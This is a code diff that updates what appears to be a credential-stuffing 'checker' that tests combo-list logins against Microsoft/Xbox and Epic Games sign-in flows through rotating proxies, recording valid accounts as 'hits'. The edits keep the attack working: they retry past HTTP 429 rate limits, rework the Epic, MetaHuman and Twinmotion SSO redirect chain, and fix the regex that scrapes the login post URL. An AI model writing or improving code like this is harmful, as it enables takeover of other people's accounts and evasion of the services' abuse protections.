@@ -850,7 +850,7 @@ class Main:
                             while True:
                                 try:
                                     response = session.post(url, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
-                                    if 'Too Many Requests' in response.text:
+                                    if response.status_code == 429:
                                         Counter.retries+=1
                                         continue
                                     else:
@@ -936,6 +936,9 @@ class Main:
                                         while True:
                                             try:
                                                 response = session.post(url2, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
+                                                if response.status_code == 429:
+                                                    Counter.retries+=1
+                                                    continue
                                                 if 'id/oauth-authorized?code=' in response.url:
                                                     if Counter.brute:
                                                         if line in Counter.remaining:
@@ -973,7 +976,6 @@ class Main:
                                             except Exception as e:
                                                 Counter.retries+=1
                                                 continue
-
                                         parsed_url = urllib.parse.urlparse(response.url)
                                         query_params = urllib.parse.parse_qs(parsed_url.query)
                                         code = query_params.get('code', [None])[0]
@@ -1082,31 +1084,7 @@ class Main:
                                                     break
                                             except Exception as e:
                                                 Counter.retries+=1
-                                                continue                             
-                                        url = "https://www.epicgames.com/id/api/csrf"
-                                        headers = {
-                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-                                            "Accept-Encoding": "gzip, deflate, br, zstd",
-                                            "Accept-Language": "en-GB,en;q=0.5",
-                                            "Connection": "keep-alive",
-                                            "DNT": "1",
-                                            "Host": "www.epicgames.com",
-                                            "Priority": "u=0, i",
-                                            "Sec-Fetch-Dest": "document",
-                                            "Sec-Fetch-Mode": "navigate",
-                                            "Sec-Fetch-Site": "none",
-                                            "Sec-Fetch-User": "?1",
-                                            "Sec-GPC": "1",
-                                            "Upgrade-Insecure-Requests": "1",
-                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
-                                        }
-                                        while True:
-                                            try:
-                                                response2 = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
-                                                break
-                                            except Exception as e:
-                                                Counter.retries+=1
-                                                continue
+                                                continue                            
                                         url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
                                         headers = {
                                             "Accept": "application/json, text/plain, */*",
@@ -1140,7 +1118,7 @@ class Main:
                                         skip = False
                                         while True:
                                             try:
-                                                response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if 'Sorry, your account has too many active logins' in response.text:
                                                         Counter.hits+=1
                                                         if line in Counter.remaining:
@@ -1252,7 +1230,7 @@ class Main:
                                                             "X-Requested-With": "XMLHttpRequest",
                                                             "X-Xsrf-Token": xsrf_token_cookie
                                                     }
-                                                    response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                     if 'Sorry, your account has too many active logins' in response.text:
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[HIT][NC] - {self.blur(line)}')
@@ -1348,7 +1326,7 @@ class Main:
                                                 if g: break
                                                 try:
                                                     response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
-                                                    if 'https://www.twinmotion.com:443/id/api/sso?sid=' in response.headers['location']:
+                                                    if 'https://www.metahuman.com:443/id/api/sso' in response.headers['location']:
                                                         url = response.headers['location']
                                                         break
                                                     else:
@@ -1363,6 +1341,26 @@ class Main:
                                                     g = True
                                                     continue
                                             if g:continue
+                                            j = False
+                                            while True:
+                                                if j: break
+                                                try:
+                                                    response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    if 'https://www.twinmotion.com:443/id/api/sso?' in response.headers['location']:
+                                                        url = response.headers['location']
+                                                        break
+                                                    else:
+                                                        Counter.retries+=1
+                                                        j = True
+                                                        continue
+                                                except KeyError:
+                                                    Counter.retries+=1
+                                                    j = True
+                                                except Exception as e:
+                                                    Counter.retries+=1
+                                                    j = True
+                                                    continue
+                                            if j:continue
                                             e = False
                                             while True:
                                                 if e: break
@@ -2052,11 +2050,11 @@ class Main:
     def parse_cookie(self,cookies, key):
         return cookies.get(key)
     def parse_source_for_url(self, source):
-        match = re.search(r"urlPost:'(.*?)'", source)
-        if match:
-            url = match.group(1)
-            return url
-        return None
+            match = re.search(r'urlPost":"(.*?)"', source)
+            if match:
+                url = match.group(1)
+                return url
+            return None
     
 
     def urlscraper(self):
